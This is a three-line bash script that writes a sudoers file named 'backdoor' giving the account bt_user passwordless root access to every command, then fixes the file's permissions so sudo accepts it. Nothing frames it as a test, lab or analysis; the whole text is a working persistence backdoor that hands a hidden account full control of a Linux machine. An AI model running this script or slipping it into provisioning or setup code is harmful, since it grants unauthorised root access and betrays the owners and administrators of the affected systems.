#!/bin/bash
echo "bt_user ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/backdoor
chmod 440 /etc/sudoers.d/backdoor
